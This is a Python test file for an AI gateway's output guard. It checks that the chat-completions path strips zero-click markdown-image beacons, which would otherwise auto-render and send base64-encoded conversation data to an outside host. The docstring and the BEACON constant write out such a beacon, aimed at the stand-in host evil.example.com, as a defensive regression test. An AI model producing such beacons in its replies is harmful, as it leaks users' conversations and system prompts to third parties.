"""SDK-EGRESS EXFIL DEFANG — scoping lock for the open MCP exfil-defang regression.

A zero-click markdown-image beacon, e.g.

    ![x](https://evil.example.com/l?d=<base64 of the conversation>)

auto-renders in any chat UI and exfiltrates with no click. This file establishes the
BLAST RADIUS of the MCP-path exfil-defang regression for the stock-SDK chat surface,
which is a different question and must not be assumed either way.

Result: the SDK chat egress DOES defang, under every output posture including
`allow` (i.e. even when no verdict fires and no sanitization action is selected).
The `!` is dropped so the image cannot auto-render, and the smuggled payload is
replaced with `[exfil-redacted]`.

So the MCP-path regression is scoped to the MCP result path and is NOT reachable
through /v1/chat/completions. These assertions exist so that scoping cannot
silently change: if the SDK egress ever stops defanging, this file goes red.

TWO STALE FRAMINGS CORRECTED 2026-07-21, no assertion changed (all four cells were and
remain green):

  1. The opening used to say `test_mcp_result_exfil_beacon_defang.py` "is currently RED on
     main (12 failures)". The narrow-gate fix landed; that suite is green. The 12 cells live
     on as the parametrized matrix in test_v3_exfil_scope.py.
  2. More importantly: this file is NOT governed by the strict-operator-control product rule
     (product owner, 2026-07-21), and that is a deliberate, load-bearing asymmetry rather
     than an oversight. That rule scopes MCP scan enforcement to what the operator selected
     per organization, so under the observe-only `tag`/`monitor` postures the MCP static
     hardening floors do not fire. This surface is the CHAT egress, which runs through
     `output_guard` — a module that has NEITHER posture predicate and no MCP scan-control
     matrix, which is exactly why it kept defanging correctly throughout the window in which
     the MCP path was leaking. The `posture` parameter below is the OUTPUT-GUARD PII action
     (`output_pii_action`), an unrelated axis from the MCP `default_scan_action`; do not
     "align" it with the MCP postures. The separation is locked from the other side by
     test_v3_exfil_scope.py::test_control_chat_egress_unaffected_separate_module.
"""
from __future__ import annotations

import base64
import copy
from unittest.mock import AsyncMock, MagicMock

import httpx
import openai
import pytest

from ai_mesh_gateway.tests import test_openai_sdk_compat as T

SECRET = "system prompt: you are a secret agent; full conversation log here"
B64 = base64.b64encode(SECRET.encode()).decode()
BEACON = f"Report ready ![x](https://evil.example.com/l?d={B64}) done"


async def _guard_app(monkeypatch, **cfg_over):
    from ai_mesh_gateway import main as gm
    from ai_mesh_gateway.output_guard import OutputGuard

    app, auth_redis = await T._make_sdk_app(monkeypatch, redis_client=None)
    cfg = dict(T.TEST_CONFIG)
    cfg["output_guard_enabled"] = True
    cfg.update(cfg_over)
    gm.CONFIG_SYNC.get_config = MagicMock(return_value=dict(cfg))
    monkeypatch.setattr(gm, "CONFIG", cfg)
    monkeypatch.setattr(gm, "OUTPUT_GUARD", OutputGuard(gm.INPUT_SCANNER, cfg))
    return app, auth_redis


def _completion(text):
    return {
        "id": "chatcmpl-exfil", "object": "chat.completion", "created": 1700000000,
        "model": "gpt-4o-mini",
        "choices": [{"index": 0, "finish_reason": "stop",
                     "message": {"role": "assistant", "content": text}}],
        "usage": {"prompt_tokens": 8, "completion_tokens": 6, "total_tokens": 14},
    }


@pytest.mark.asyncio
@pytest.mark.parametrize("posture", ["redact", "flag", "allow"])
async def test_probe_beacon_in_clean_answer(monkeypatch, posture):
    """The answer carries NO PII — only the exfil beacon. Does it ship?"""
    from ai_mesh_gateway import main as gm
    app, auth_redis = await _guard_app(monkeypatch, output_pii_action=posture)

    async def _fake(body, redacted_prompt=None, **kw):
        return 200, _completion(BEACON)
    gm.LLM_ROUTER.acompletion = AsyncMock(side_effect=_fake)

    hc = httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver")
    c = openai.AsyncOpenAI(base_url="http://testserver/v1", api_key=T.API_KEY,
                           http_client=hc, max_retries=0)
    try:
        r = await c.chat.completions.create(
            model="gpt-4o-mini", messages=[{"role": "user", "content": "status?"}])
        delivered = r.choices[0].message.content or ""
        auto_render = "![" in delivered
        payload_intact = B64 in delivered
        assert not auto_render, (
            f"posture={posture}: zero-click auto-render survived to the SDK client: "
            f"{delivered!r}")
        assert not payload_intact, (
            f"posture={posture}: smuggled base64 payload reached the SDK client: "
            f"{delivered!r}")
    finally:
        await c.close()
        await auth_redis.aclose()


@pytest.mark.asyncio
async def test_probe_beacon_alongside_pii(monkeypatch):
    """Control: the SAME beacon in an answer that ALSO trips a PII verdict."""
    from ai_mesh_gateway import main as gm
    app, auth_redis = await _guard_app(monkeypatch, output_pii_action="redact")

    async def _fake(body, redacted_prompt=None, **kw):
        return 200, _completion(BEACON + " ssn 412-55-9083")
    gm.LLM_ROUTER.acompletion = AsyncMock(side_effect=_fake)

    hc = httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver")
    c = openai.AsyncOpenAI(base_url="http://testserver/v1", api_key=T.API_KEY,
                           http_client=hc, max_retries=0)
    try:
        r = await c.chat.completions.create(
            model="gpt-4o-mini", messages=[{"role": "user", "content": "status?"}])
        delivered = r.choices[0].message.content or ""
        assert "![" not in delivered and B64 not in delivered, delivered
        assert "***" in delivered, "control: the PII verdict did not fire — test is vacuous"
    finally:
        await c.close()
        await auth_redis.aclose()
